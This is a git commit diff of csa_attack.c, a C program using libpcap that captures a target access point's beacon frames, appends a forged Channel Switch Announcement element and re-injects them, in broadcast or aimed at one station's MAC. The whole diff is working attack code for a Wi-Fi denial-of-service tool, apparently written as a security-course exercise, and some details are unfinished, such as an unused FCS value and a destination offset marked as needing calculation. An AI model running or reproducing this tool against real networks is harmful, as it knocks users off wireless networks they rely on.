a967072433548e34cd92dbdb7ede4787491a85d9
2w <hsp003636@gmail.com>
2024-01-31 07:15:28 -0500

    broadcast mode is correctly add 5byte

--- csa_attack.c
+++ csa_attack.c
@@ -21,6 +21,7 @@ void packet_view(
     const struct pcap_pkthdr *h,
     const unsigned char *p
 );
+void process_packet(const struct pcap_pkthdr *header, const unsigned char *packet, char *station_mac);
 
 pcap_t *global_handle;
 
@@ -33,17 +34,9 @@ int main(int argc, char *argv[]) {
     char *interfaceName = argv[1];
     char *ap_mac = argv[2];
     char *station_mac = argv[3];
-
-    struct Packet packet;
-
-    // initPacket(&packet, argv[2]);
-    
-    if (argc == 3) {
-        AP_broadcast_frame(&packet);
-        printf("AP_Broadcast Mode\n");
-    } else if (argc == 4) {
-        AP_unicast_frame(&packet, argv[3]);
-        printf("AP_Unicast Mode\n");
+    bool flag = false;
+    if(station_mac != NULL){
+        printf("Unicast Mode\n");
     }
 
     char errbuf[PCAP_ERRBUF_SIZE];
@@ -55,7 +48,8 @@ int main(int argc, char *argv[]) {
 
      // Beacon Frame 필터를 설정
     struct bpf_program fp;
-    char filter_exp[] = "type mgt subtype beacon"; // Beacon Frame 필터
+    char filter_exp[100];
+    snprintf(filter_exp, sizeof(filter_exp), "type mgt subtype beacon and ether host %s", argv[2]);
     if (pcap_compile(handle, &fp, filter_exp, 0, PCAP_NETMASK_UNKNOWN) == -1) {
         fprintf(stderr, "Couldn't parse filter %s: %s\n", filter_exp, pcap_geterr(handle));
         return -1;
@@ -74,12 +68,19 @@ int main(int argc, char *argv[]) {
         const unsigned char *cap_packet;
 
         int result = pcap_next_ex(handle, &header, &cap_packet);
-        packet_view(header, cap_packet); //제대로 잡긴하네
 
-        if (pcap_sendpacket(handle, cap_packet, header->len) != 0) {
-            printf("Frame send failed\n");
-            cleanup(handle);
-            exit(-1);
+        
+        
+        if (result == 1) {  // 정상적으로 패킷을 가져온 경우
+            packet_view(header, cap_packet);
+            process_packet(header, cap_packet,station_mac);
+            // packet_view(header, cap_packet); //제대로 잡긴하네
+        } else if (result == -1) {  // 에러가 발생한 경우
+            fprintf(stderr, "Error occurred while capturing packets: %s\n", pcap_geterr(handle));
+        } else if (result == 0) {  // 타임아웃이 발생한 경우
+            printf("Time Out\n");
+            pcap_close(handle);
+            exit(0);
         }
         sleep(1);
     }
@@ -92,26 +93,6 @@ void usage() {
     printf("Syntax is incorrect.\n");
     printf("syntax : csa-attack <interface> <ap mac> [<station mac>]\n");
     printf("sample : csa-attack mon0 00:11:22:33:44:55 66:77:88:99:AA:BB\n");
-}
-
-void initPacket(struct Packet *packet, char *ap_mac) {
-    memset(packet, 0, sizeof(struct Packet));
-    packet->radiotap.it_len = 0x0018;
-    packet->deauth.type = 0xc0;
-    macStringToUint8(ap_mac, packet->deauth.source_address);
-    macStringToUint8(ap_mac, packet->deauth.bssid);
-
-    // CSA 정보 추가
-    uint8_t channel_num[5] = {0x25, 0x03, 0x01, 0x13, 0x03};
-    memcpy(packet->channel_switch_announcement, channel_num, sizeof(channel_num));
-}
-
-void AP_broadcast_frame(struct Packet *packet) {
-    memset(packet->deauth.destination_address, 0xFF, 6);
-}
-
-void AP_unicast_frame(struct Packet *packet, char *station_mac) {
-    macStringToUint8(station_mac, packet->deauth.destination_address);
 }
 
 void macStringToUint8(char *mac_string, uint8_t *ap_mac) {
@@ -131,19 +112,46 @@ void cleanup(pcap_t *handle) {
     pcap_close(handle);
 }
 
-void packet_view(
-    const struct pcap_pkthdr *h,
-    const unsigned char *p
-){
-    int len;
-    len = 0;
-
-    printf("PACKET\n");
-    while(len < h->len) {
-        printf("%02x ", *(p++));
-        if(!(++len % 16))
-            printf("\n");
-    }
-    printf("\n");
-    return ;
+void packet_view(const struct pcap_pkthdr *h, const unsigned char *p) {
+    int len = 0;
+    printf("PACKET (Total Length: %d bytes)\n", h->len);
+    return;
 }
+
+
+
+void process_packet(const struct pcap_pkthdr *header, const unsigned char *packet, char *station_mac) {
+    int fcs_offset = header->len - 4; // FCS는 마지막 4바이트
+    uint32_t fcs_value = *((uint32_t *)(packet + fcs_offset));
+
+    // CSA 정보 추가
+    uint8_t csa_data[5] = {0x25, 0x03, 0x01, 0x13, 0x03};
+
+    // 패킷에 CSA 정보 추가
+    int new_packet_len = header->len + sizeof(csa_data);
+    unsigned char *new_packet = (unsigned char *)malloc(new_packet_len);
+    if (new_packet != NULL) {
+        memcpy(new_packet, packet, header->len);
+        memcpy(new_packet + header->len, csa_data, sizeof(csa_data));
+
+        // Unicast 대상인 경우, destination_address 수정
+        if (station_mac != NULL) {
+            macStringToUint8(station_mac, new_packet + 4); // 수정할 위치 계산 필요
+        }
+
+        // 패킷 보내기 전에 패킷 정보 출력
+        packet_view(header, new_packet);
+
+        if (pcap_sendpacket(global_handle, new_packet, new_packet_len) != 0) {
+            fprintf(stderr, "Frame send failed\n");
+            cleanup(global_handle);
+            exit(-1);
+        }
+
+        free(new_packet);
+    } else {
+        fprintf(stderr, "Memory allocation failed\n");
+    }
+}
+
+
